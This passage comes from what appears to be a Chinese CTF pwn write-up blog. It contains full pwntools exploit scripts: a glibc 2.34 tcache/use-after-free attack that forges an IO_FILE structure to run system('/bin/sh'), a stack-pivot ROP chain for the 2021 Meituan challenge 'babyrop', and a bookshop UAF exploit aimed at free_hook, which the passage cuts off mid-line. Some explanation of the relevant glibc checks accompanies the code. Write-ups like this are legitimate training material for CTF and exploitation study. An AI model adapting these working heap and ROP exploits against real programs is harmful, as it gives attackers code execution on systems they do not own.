alt="delete" title="delete"></p><p>程序允许用户执行一次<code>uaf</code>，并且允许用户从<code>tcache bin</code>中获取两次<code>chunk</code>，那么重点就是这唯一一次<code>uaf</code>如何使用，我的想法是用于泄露<code>chunk地址</code>和<code>libc地址</code>，并用于修改<code>small bin</code>中<code>chunk</code>的<code>bk字段</code>为某个<code>tcache bin</code>的地址，<code>tcache bin</code>的地址可以通过<code>chunk</code>的地址进行计算,<code>small bin</code>中<code>chunk</code>逆序进入<code>tcache bin</code>,这时当前<code>tcache bin</code>的第一个成员就为某一个<code>tcache bin</code>的地址，当我们在<code>tcache bin</code>的地址创建一个<code>chunk</code>，并修改<code>tcache bin</code>的内容，就可以在一个任意地址创建<code>chunk</code>，进行任意读写,因为libc2.34中删除了<code>malloc_hook</code>,<code>free_hook</code>，所以我们只能利用<code>IO</code>调用<code>system函数</code>或<code>one_gadget</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">size,ind,mode=<span class="hljs-number">1</span></span>):<br>    p.sendlineafter(<span class="hljs-string">&#x27;&gt;&gt; &#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;size:&#x27;</span>,<span class="hljs-built_in">str</span>(size))<br>    p.sendlineafter(<span class="hljs-string">&#x27;note:&#x27;</span>,<span class="hljs-built_in">str</span>(ind))<br>    p.sendlineafter(<span class="hljs-string">&#x27;[2]&#x27;</span>,<span class="hljs-built_in">str</span>(mode))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">free</span>(<span class="hljs-params">ind,mode=<span class="hljs-number">1</span></span>):<br>    <span class="hljs-keyword">if</span> mode:<br>        p.sendlineafter(<span class="hljs-string">&#x27;&gt;&gt; &#x27;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br>        p.sendlineafter(<span class="hljs-string">&#x27;note:&#x27;</span>,<span class="hljs-built_in">str</span>(ind))<br>    <span class="hljs-keyword">else</span>:<br>        p.sendlineafter(<span class="hljs-string">&#x27;&gt;&gt; &#x27;</span>,<span class="hljs-string">&#x27;666&#x27;</span>)<br>        p.sendlineafter(<span class="hljs-string">&#x27;note:&#x27;</span>,<span class="hljs-built_in">str</span>(ind))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">ind</span>):<br>    p.sendlineafter(<span class="hljs-string">&#x27;&gt;&gt; &#x27;</span>,<span class="hljs-string">&#x27;3&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;show?&#x27;</span>,<span class="hljs-built_in">str</span>(ind))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">ind,data</span>):<br>    p.sendlineafter(<span class="hljs-string">&#x27;&gt;&gt; &#x27;</span>,<span class="hljs-string">&#x27;4&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;note:&#x27;</span>,<span class="hljs-built_in">str</span>(ind))<br>    p.sendafter(<span class="hljs-string">&#x27;content:&#x27;</span>,data)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">pwn</span>(<span class="hljs-params">p</span>):<br><br>    libc=ELF(<span class="hljs-string">&quot;libc.so.6&quot;</span>,checksec=<span class="hljs-number">0</span>)<br>    ld=ELF(<span class="hljs-string">&#x27;ld-2.34.so&#x27;</span>,checksec=<span class="hljs-number">0</span>)<br><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>):<br>        add(<span class="hljs-number">0x98</span>,i)<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>):<br>        free(i)<br><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>        add(<span class="hljs-number">0xa8</span>,i)<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>        free(i)<br><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>        add(<span class="hljs-number">0x148</span>,i)<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>        free(i)<br><br>    add(<span class="hljs-number">0x158</span>,<span class="hljs-number">1</span>)<br>    free(<span class="hljs-number">1</span>)<br><br>    add(<span class="hljs-number">0x148</span>,<span class="hljs-number">0</span>)<br>    add(<span class="hljs-number">0xa8</span>,<span class="hljs-number">1</span>)<br>    free(<span class="hljs-number">0</span>)<br>    add(<span class="hljs-number">0xa8</span>,<span class="hljs-number">0</span>)<br><br>    add(<span class="hljs-number">0x148</span>,<span class="hljs-number">2</span>)<br>    add(<span class="hljs-number">0xa8</span>,<span class="hljs-number">3</span>)<br>    free(<span class="hljs-number">2</span>)<br>    add(<span class="hljs-number">0xa8</span>,<span class="hljs-number">2</span>)<br><br>    add(<span class="hljs-number">0xa8</span>,<span class="hljs-number">5</span>)<br>    add(<span class="hljs-number">0xa8</span>,<span class="hljs-number">6</span>)<br>    free(<span class="hljs-number">5</span>)<br>    free(<span class="hljs-number">6</span>,<span class="hljs-number">0</span>)  <span class="hljs-comment">#6 = addr</span><br><br>    add(<span class="hljs-number">0x148</span>,<span class="hljs-number">4</span>)<br>    add(<span class="hljs-number">0xa8</span>,<span class="hljs-number">5</span>)<br>    free(<span class="hljs-number">4</span>)<br>    add(<span class="hljs-number">0xa8</span>,<span class="hljs-number">4</span>)<br>    add(<span class="hljs-number">0x148</span>,<span class="hljs-number">7</span>)<br>    <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">        利用chunk分裂，将0xa0大小的chunk放入small bin</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br>    context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br>    show(<span class="hljs-number">6</span>)<br><br>    p.readuntil(<span class="hljs-string">&#x27;content: &#x27;</span>)<br>    smallb_2=u64(p.readuntil(<span class="hljs-string">&#x27;\n&#x27;</span>,drop=<span class="hljs-number">1</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(smallb_2))<br>    tcache_150=(smallb_2-<span class="hljs-number">0x150</span>*<span class="hljs-number">7</span>-<span class="hljs-number">0xb0</span>*<span class="hljs-number">7</span>-<span class="hljs-number">0xa0</span>*<span class="hljs-number">4</span>-<span class="hljs-number">0x150</span>-<span class="hljs-number">0xb0</span>-<span class="hljs-number">0xb0</span>)&amp;<span class="hljs-number">0xfffffffffffff000</span><br>    tcache_150+=<span class="hljs-number">0x128</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(tcache_150))<br>    gadget_back=smallb_2+<span class="hljs-number">0xa0</span>+<span class="hljs-number">0xb0</span>+<span class="hljs-number">0x150</span>+<span class="hljs-number">0xb0</span>+<span class="hljs-number">0x10</span><br>    gadget_back1=gadget_back+<span class="hljs-number">0x150</span><br>    edit(<span class="hljs-number">6</span>,<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">8</span>)<br>    show(<span class="hljs-number">6</span>)<br>    p.readuntil(<span class="hljs-string">&#x27;aaaaaaaa&#x27;</span>)<br>    d=u64(p.readuntil(<span class="hljs-string">&#x27;\n&#x27;</span>,drop=<span class="hljs-number">1</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(d))<br><br>    stdin=d-<span class="hljs-number">0x200</span>-<span class="hljs-number">208</span><br>    libc.address=stdin-libc.sym[<span class="hljs-string">&#x27;_IO_2_1_stdin_&#x27;</span>]<br><br>    stdout=libc.sym[<span class="hljs-string">&#x27;_IO_2_1_stdout_&#x27;</span>]<br>    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(stdout))<br><br>    edit(<span class="hljs-number">6</span>,p64(smallb_2)+p64(tcache_150-<span class="hljs-number">0x18</span>))<br>    <br>    add(<span class="hljs-number">0x98</span>,<span class="hljs-number">8</span>)<br>    add(<span class="hljs-number">0x98</span>,<span class="hljs-number">9</span>,<span class="hljs-number">2</span>)<br>    edit(<span class="hljs-number">9</span>,p64(stdout)*<span class="hljs-number">2</span>)<br>    add(<span class="hljs-number">0x148</span>,<span class="hljs-number">10</span>,<span class="hljs-number">2</span>)<br><br>    system=libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br>    io_lock=libc.address+<span class="hljs-number">2210384</span><br>    io_wfile_jump=libc.sym[<span class="hljs-string">&#x27;_IO_wfile_jumps&#x27;</span>]<br><br>    fake_IO=<span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>+p64(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span><br>    fake_IO+=p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">1</span>)<br>    fake_IO+=p64(system)+p64(system+<span class="hljs-number">1</span>)<br>    fake_IO+=p64(<span class="hljs-number">0</span>)*<span class="hljs-number">5</span><br>    fake_IO+=p64(<span class="hljs-number">1</span>)+p64(<span class="hljs-number">0xffffffffffffffff</span>)<br>    fake_IO+=p64(<span class="hljs-number">0</span>)+p64(io_lock)<br>    fake_IO+=p64(<span class="hljs-number">0xffffffffffffffff</span>)+p64(<span class="hljs-number">0</span>)<br>    fake_IO+=p64(stdout+<span class="hljs-number">0x10</span>)+p64(<span class="hljs-number">0</span>)<br>    fake_IO+=p64(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span><br>    fake_IO+=p64(<span class="hljs-number">0xffffffff</span>)+p64(<span class="hljs-number">0</span>)<br>    fake_IO+=p64(<span class="hljs-number">0</span>)+p64(io_wfile_jump+<span class="hljs-number">0x10</span>)<br>    fake_IO+=p64(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span>+p64(stdout+<span class="hljs-number">0x20</span>)<br>    <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">      修改原stdout的vtable字段为 IO_wfile_jumps+0x10</span><br><span class="hljs-string">      使原本应该的 xputsn 项指向 _IO_wfile_seekoff</span><br><span class="hljs-string">      在_IO_wfile_seekoff函数中会调用_IO_switch_to_wget_mode 函数</span><br><span class="hljs-string">      在_IO_switch_to_wget_mode会调用stdout的wide_data字段的vtable字段中overflow项对应的函数，参数为指向stdout的指针</span><br><span class="hljs-string"></span><br><span class="hljs-string">      要注意的是在高版本libc中对 IO结构体的vtable指针进行了检测</span><br><span class="hljs-string">      防止vtable 指向任意位置</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br>    edit(<span class="hljs-number">10</span>,fake_IO)<br><br>    p.interactive()<br>    <br>p=process(<span class="hljs-string">&#x27;./back&#x27;</span>)<br>pwn(p)<br></code></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* vtable检测函数 */</span><br><span class="hljs-type">static</span> <span class="hljs-keyword">inline</span> <span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> _IO_jump_t *<br><span class="hljs-title function_">IO_validate_vtable</span> <span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> _IO_jump_t *vtable)</span><br>&#123;<br>  <span class="hljs-comment">/* Fast path: The vtable pointer is within the __libc_IO_vtables</span><br><span class="hljs-comment">     section.  */</span><br>  <span class="hljs-type">uintptr_t</span> section_length = __stop___libc_IO_vtables - __start___libc_IO_vtables;<br>  <span class="hljs-type">uintptr_t</span> ptr = (<span class="hljs-type">uintptr_t</span>) vtable;<br>  <span class="hljs-type">uintptr_t</span> offset = ptr - (<span class="hljs-type">uintptr_t</span>) __start___libc_IO_vtables;<br>  <span class="hljs-keyword">if</span> (__glibc_unlikely (offset &gt;= section_length))<br>    <span class="hljs-comment">/* The vtable pointer is not in the expected section.  Use the</span><br><span class="hljs-comment">       slow path, which will terminate the process if necessary.  */</span><br>    _IO_vtable_check ();<br>  <span class="hljs-keyword">return</span> vtable;<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>wp</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf</tag>
      
      <tag>pwn</tag>
      
      <tag>wp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>2021美团高校挑战赛-pwn</title>
    <link href="/page/wp/2021%E7%BE%8E%E5%9B%A2%E9%AB%98%E6%A0%A1%E6%8C%91%E6%88%98%E8%B5%9B-pwn/"/>
    <url>/page/wp/2021%E7%BE%8E%E5%9B%A2%E9%AB%98%E6%A0%A1%E6%8C%91%E6%88%98%E8%B5%9B-pwn/</url>
    
    <content type="html"><![CDATA[<h2 id="babyrop">babyrop</h2><p><img src="/img/blog_img/MTCTF/MTCTF-pwn-babyrop.jpg" srcset="/img/loading.gif" lazyload alt="main函数代码" title="main函数代码"></p><p><img src="/img/blog_img/MTCTF/MTCTF-pwn-babyrop-1.jpg" srcset="/img/loading.gif" lazyload alt="vuln函数代码" title="vuln函数代码"></p><p><code>main函数</code>中<code>v6变量</code>仅占<code>24字节</code>，但却允许输入<code>25</code>个字节，刚好可以泄露<code>cookie</code>的值<br>在<code>main函数</code>伪代码中，输入<code>v5</code>的值处，并不是让<code>v5</code>的值为<code>&quot;password&quot;</code>，而是要<code>v5</code>的值为<code>&quot;password&quot;</code>的地址</p><p><code>vuln函数</code>中存在栈溢出，但溢出数据长度较小， 仅能做到修改<code>rip</code>的值，所以要通过多次栈迁移构造payload</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>libc=ELF(<span class="hljs-string">&#x27;./libc.so.6&#x27;</span>,checksec=<span class="hljs-number">0</span>)<br>e=ELF(<span class="hljs-string">&#x27;./babyrop&#x27;</span>,checksec=<span class="hljs-number">0</span>)<br>bss=e.bss(<span class="hljs-number">0x700</span>)<br>leave=<span class="hljs-number">0x400759</span><br>ret=<span class="hljs-number">0x40075a</span><br>rdi=<span class="hljs-number">0x400913</span><br>rsi_15=<span class="hljs-number">0x400911</span><br>read=<span class="hljs-number">0x40072e</span><br>read_ret=<span class="hljs-number">0x400744</span><br><br>puts=e.plt[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>func=<span class="hljs-string">&#x27;puts&#x27;</span><br>func_got=e.got[func]<br><br>p=process(<span class="hljs-string">&#x27;./babyrop&#x27;</span>)<br>p.sendafter(<span class="hljs-string">&#x27;name? &#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">25</span>)<br>p.readuntil(<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">25</span>)<br>cookie=u64(<span class="hljs-string">b&#x27;\x00&#x27;</span>+p.read(<span class="hljs-number">7</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(cookie))<br><br>p.sendlineafter(<span class="hljs-string">&#x27;challenge&#x27;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-number">0x4009ae</span>))<br>p.readuntil(<span class="hljs-string">&#x27;message\n&#x27;</span>)<br>payload=<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">24</span>+p64(cookie)+p64(bss)+p64(read)<br>p.send(payload)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(bss))<br>payload=p64(bss+<span class="hljs-number">0x100</span>)+p64(rdi)+p64(func_got)+p64(cookie)+p64(bss+<span class="hljs-number">0x18</span>)+p64(read)<br>p.send(payload)<br><br>payload=p64(puts)+p64(read)+p64(read_ret)+p64(cookie)+p64(bss-<span class="hljs-number">0x20</span>)+p64(leave)<br>p.send(payload)<br><br>bss=bss+<span class="hljs-number">0x100</span><br>d=u64(p.read(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\x00&#x27;</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(d))<br>libc.address=d-libc.sym[func]<br>bin_sh=libc.search(<span class="hljs-string">&#x27;/bin/sh&#x27;</span>).<span class="hljs-built_in">next</span>()<br>system=libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br><br>payload=p64(rdi)+p64(bin_sh)+p64(system)+p64(cookie)+p64(bss-<span class="hljs-number">0x28</span>)+p64(leave)<br>p.send(payload)<br>p.interactive()<br></code></pre></td></tr></table></figure><h2 id="bookshop">bookshop</h2><p><img src="/img/blog_img/MTCTF/MTCTF-pwn-bookshop.jpg" srcset="/img/loading.gif" lazyload alt="main函数代码" title="main函数代码"></p><p><img src="/img/blog_img/MTCTF/MTCTF-pwn-bookshop-1.jpg" srcset="/img/loading.gif" lazyload alt="create函数代码" title="create函数代码"></p><p><img src="/img/blog_img/MTCTF/MTCTF-pwn-bookshop-2.jpg" srcset="/img/loading.gif" lazyload alt="delete函数代码" title="delete函数代码"></p><p><img src="/img/blog_img/MTCTF/MTCTF-pwn-bookshop-3.jpg" srcset="/img/loading.gif" lazyload alt="show函数代码" title="show函数代码"></p><ul><li>程序中仅允许创建<code>24</code>个<code>chunk</code></li><li>每个<code>chunk</code>只有在创建时才能写入</li><li>释放时，没有清空指针，存在<code>UAF</code></li></ul><p>目标是向free_hook中写入system函数地址，要实现这个目标，仅利用<code>tcache bin</code>是不够的，需要同时利用<code>unsorted bin</code>，将多个伪造的<code>chunk</code>放入<code>tcache bin</code>中，然后修改<code>tcache bin</code>链表结构</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* unsorted bin的判定 */</span><br><span class="hljs-keyword">if</span> (__glibc_unlikely (size &lt;= <span class="hljs-number">2</span> * SIZE_SZ)<br>    || __glibc_unlikely (size &gt; av-&gt;system_mem))<br>  malloc_printerr (<span class="hljs-string">&quot;malloc(): invalid size (unsorted)&quot;</span>);<br><span class="hljs-keyword">if</span> (__glibc_unlikely (chunksize_nomask (next) &lt; <span class="hljs-number">2</span> * SIZE_SZ)<br>    || __glibc_unlikely (chunksize_nomask (next) &gt; av-&gt;system_mem))<br>  malloc_printerr (<span class="hljs-string">&quot;malloc(): invalid next size (unsorted)&quot;</span>);<br><span class="hljs-keyword">if</span> (__glibc_unlikely ((prev_size (next) &amp; ~(SIZE_BITS)) != size))<br>  malloc_printerr (<span class="hljs-string">&quot;malloc(): mismatching next-&gt;prev_size (unsorted)&quot;</span>);<br><span class="hljs-keyword">if</span> (__glibc_unlikely (bck-&gt;fd != victim)<br>    || __glibc_unlikely (victim-&gt;fd != unsorted_chunks (av)))<br>  malloc_printerr (<span class="hljs-string">&quot;malloc(): unsorted double linked list corrupted&quot;</span>);<br><span class="hljs-keyword">if</span> (__glibc_unlikely (prev_inuse (next)))<br>  malloc_printerr (<span class="hljs-string">&quot;malloc(): invalid next-&gt;prev_inuse (unsorted)&quot;</span>);<br></code></pre></td></tr></table></figure><p>在<code>libc2.31</code>中对<code>unsorted bin</code>的检测已经较为完善了，所以我们需要在<code>unsorted bin</code>原先完整的双链表中添加成员，使其看起来正常，</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python">举个例子：<br>  先在unsorted <span class="hljs-built_in">bin</span>中放入两个chunk(a与b)<br>  然后构造payload设置unsorted <span class="hljs-built_in">bin</span>为 a &lt;=&gt; c &lt;=&gt; d &lt;=&gt; b<br>  这时unsorted <span class="hljs-built_in">bin</span>作为一个双链表成立<br></code></pre></td></tr></table></figure><p>因为只要对应的<code>tcache bin</code>中没有存满，程序就会将<code>chunk</code>放入对应的<code>tcache bin</code>中，而且这里存在<code>uaf</code>，所以我们只要先将<code>chunk_a</code>放入<code>unsorted bin</code>中，然后通过获取<code>chunk</code>使<code>tcache bin</code>为未存满的状态，然后再释放<code>chunk_a</code>，这样<code>chunk_a</code>就会同时存在于<code>tcache bin</code>与<code>unsorted bin</code>中，当下次获取<code>chunk</code>时，就会优先从<code>tcache bin</code>中获取，在这时修改<code>chunk_a</code>的值，就可以修改<code>unsorted bin</code>的结构</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">data=<span class="hljs-string">&#x27; &#x27;</span></span>):<br>    p.sendlineafter(<span class="hljs-string">&#x27;&gt;&gt; &#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>    p.sendafter(<span class="hljs-string">&#x27;Book\n&gt; &#x27;</span>,data)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">free</span>(<span class="hljs-params">ind</span>):<br>    p.sendlineafter(<span class="hljs-string">&#x27;&gt;&gt; &#x27;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;bag?&#x27;</span>,<span class="hljs-built_in">str</span>(ind))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">ind</span>):<br>    p.sendlineafter(<span class="hljs-string">&#x27;&gt;&gt; &#x27;</span>,<span class="hljs-string">&#x27;3&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;read?&#x27;</span>,<span class="hljs-built_in">str</span>(ind))<br><br><br>libc=ELF(<span class="hljs-string">&#x27;./libc.so.6&#x27;</span>,checksec=<span class="hljs-number">0</span>)<br>p=process(<span class="hljs-string">&#x27;./bookshop&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">&#x27;number?&#x27;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-number">0x98</span>))<br><br>add() <span class="hljs-comment">#0</span><br>add() <span class="hljs-comment">#1</span><br>add() <span class="hljs-comment">#2</span><br>add() <span class="hljs-comment">#3</span><br>add() <span class="hljs-comment">#4</span><br>add() <span class="hljs-comment">#5</span><br>add() <span class="hljs-comment">#6</span><br>add() <span class="hljs-comment">#7</span><br>payload=p64(<span class="hljs-number">0xa0</span>)*<span class="hljs-number">0x13</span><br>add(payload) <span class="hljs-comment">#8</span><br>add(payload) <span class="hljs-comment">#9</span><br>add(payload) <span class="hljs-comment">#10</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>    free(i)<br><br>show(<span class="hljs-number">1</span>)<br>p.readuntil(<span class="hljs-string">&#x27;Content: &#x27;</span>)<br>heap_0=u64(p.read(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\x00&#x27;</span>))-<span class="hljs-number">0x10</span><br>heap_7=heap_0+<span class="hljs-number">0xa0</span>*<span class="hljs-number">7</span><br>heap_7_1=heap_7+<span class="hljs-number">0x30</span><br>heap_7_2=heap_7_1+<span 